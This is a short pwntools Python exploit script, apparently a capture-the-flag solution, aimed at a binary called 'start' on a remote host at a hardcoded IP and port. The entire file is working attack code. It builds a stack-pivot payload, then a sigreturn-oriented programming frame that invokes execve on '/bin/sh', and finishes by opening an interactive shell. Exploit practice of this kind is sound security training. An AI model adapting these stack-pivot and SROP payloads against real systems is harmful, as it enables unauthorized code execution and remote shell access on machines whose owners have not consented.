#!/usr/bin/python3

from pwn import *
import subprocess

context.binary = exe = ELF('./start', checksec=False)
context.log_level = 'critical'

# p = process(exe.path)
p = remote('139.180.134.15', 7336)

############################
### Stage 1: Stack pivot ###
############################
rw_section = 0x00000000403900
payload = b'A'*0x400
payload += flat(
    rw_section,
    0x40103c
    )
assert(len(payload)==0x410)
p.sendafter(b'say? ', payload)

#####################
### Stage 2: SROP ###
#####################
syscall = 0x000000000040100f
leave_ret = 0x401065

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = rw_section - 0x400
frame.rip = syscall
frame.rsp = rw_section
payload = b'A'*0x100
payload += flat(
    rw_section - 0x300 + 0x8,
    0x401043,
    syscall,
    bytes(frame)
    )
payload = payload.ljust(0x400, b'P')
payload += flat(
    rw_section - 0x300,
    leave_ret)
p.send(payload)

p.send(b'/bin/sh\x00' + b'\x00'*7)
p.interactive()